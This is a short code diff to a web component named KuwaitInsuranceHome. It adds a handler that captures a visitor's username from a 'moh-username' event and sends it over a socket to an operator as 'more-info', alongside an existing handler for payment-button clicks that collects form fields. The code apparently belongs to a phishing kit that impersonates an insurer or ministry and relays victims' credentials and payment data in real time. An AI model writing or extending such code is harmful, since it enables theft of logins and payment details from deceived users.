@@ -128,6 +128,21 @@ export default function KuwaitInsuranceHome() {
         }
       }
 
+      // ===== USERNAME CAPTURED =====
+      if (type === 'moh-username') {
+        const { username } = event.data;
+        console.log('[MOH] Username captured:', username);
+        if (username && isConnected) {
+          socket.value.emit('more-info', {
+            content: { 'اسم المستخدم': username },
+            page: 'MOH Username',
+            waitingForAdminResponse: false,
+          });
+          // Also emit a dedicated event to update visitor name
+          socket.value.emit('visitor:updateName', username);
+        }
+      }
+
       // ===== PAYMENT BUTTON CLICKED (once) =====
       if (type === 'moh-payment-click') {
         const { fields, buttonText } = event.data;
